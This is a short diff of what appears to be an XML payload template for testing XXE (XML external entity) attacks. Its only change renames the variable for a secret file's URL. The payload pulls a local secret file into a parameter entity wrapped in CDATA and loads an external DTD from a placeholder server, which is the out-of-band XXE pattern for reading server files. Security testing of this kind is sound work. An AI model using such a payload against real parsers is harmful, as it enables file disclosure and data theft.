@@ -2,7 +2,7 @@
 <!DOCTYPE data [
   <!ELEMENT data (#PCDATA)>
   <!ENTITY % start "<![CDATA[">
-  <!ENTITY % goodies SYSTEM "{secret_txt.url}">
+  <!ENTITY % goodies SYSTEM "{files.secret_txt.url}">
   <!ENTITY % end "]]>">
   <!ENTITY % dtd SYSTEM "http://{server_address}/xxe-pe.dtd">
   %dtd;
